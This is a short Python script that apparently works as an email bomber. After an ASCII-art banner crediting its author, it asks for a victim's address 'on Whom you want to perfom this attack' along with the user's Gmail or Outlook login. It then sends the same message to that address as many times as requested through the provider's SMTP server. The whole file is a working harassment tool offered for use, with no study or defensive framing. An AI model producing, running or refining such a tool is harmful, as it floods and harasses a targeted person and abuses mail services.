import smtplib
import time
import os,sys
from colorama import Fore



x = (Fore.RED+f"""
    ⠀⠀⠀⣠⣶⣾⣾⣷⣷⣶⣄    
⠀⠀⠀⠀⠀⠀⣼⢏⣿⣿⣿⣿⣿⣿⣿⣧   
⠀⠀⠀⠀⠀⠀⣟⣼⠿⠻⣿⣿⠟⠿⣿⣿⠀⠀⠀{Fore.GREEN} [*]{Fore.WHITE} Create by{Fore.MAGENTA} :{Fore.RED} Bardia shovaliye
⠀⠀⠀⠀⠀⠀⢣⣿⠀⣀⡿⣷⡀⢀⣯⠚⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣣⣼⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣠⣤⡄⠀⠀⢰⣎⢹⣛⢻⡛⣵⡂⠀⠀⠀⢀⣀⡀⠀⠀
⣾⣿⣿⣿⣦⡀⠀⠈⢿⣔⣔⣰⣠⡿⠀⠀⠀⣠⣾⣿⣿⣦⡀     
⠛⠛⠶⢯⣿⣿⣷⣦⣌⡙⠛⠛⠋⣀⣤⣶⣿⣿⣻⣯⠿⠿⠇    
⠀{Fore.MAGENTA}⠀⠀⠀⠀⠀⠉⠛⠻⢿⣿⣶⣜⡿⡿⠿⠛⠉⠉⠀⠀⠀⠀⠀
⣠⣀⣄⣀⣄⣤⣴⣾⣿⠾⠝⠿⣿⣷⣦⣄⣀⡀⡀⠀   ⠀⠀⠀
⢿⣿⢿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠉⠛⠿⣟⣿⣿⣿⣿⣷⠀     
⠀⠀⠙⠓⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⠯⠿⠉    """)

for c in x:
	sys.stdout.write(c)
	sys.stdout.flush()
	time.sleep(0)
	
print('')
time.sleep(0)
try:
    bomb_email = input(f"\033[31m Enter Email address on Whom you want to perfom this attack: ")
    email = input(f"\033[36m Enter your gmail_address:")
    password = input(f"\033[35m Enter your gmail_password:")
    message = input(f"\033[34m Enter Message:")
    counter = int(input(f"{Fore.YELLOW} How many message you want to send?:"))

    # gmail of outlook
    s_ = input(f'{Fore.GREEN} Select the service provider (Gmail / Outlook): ').lower()

    if s_ == "gmail":
        mail = smtplib.SMTP('smtp.gmail.com',587)
    elif s_ == "outlook":
        mail = smtplib.SMTP('smtp.office365.com',587)

    for x in range(0,counter):
        print("Number of Message Sent : ", x+1)
        mail.ehlo()
        mail.starttls()
        mail.login(email,password)
        mail.sendmail(email,bomb_email,message)
        time.sleep(1)

    mail.close()
except Exception as e:
    print("Something is wrong, please Re-try Again with Valid input.")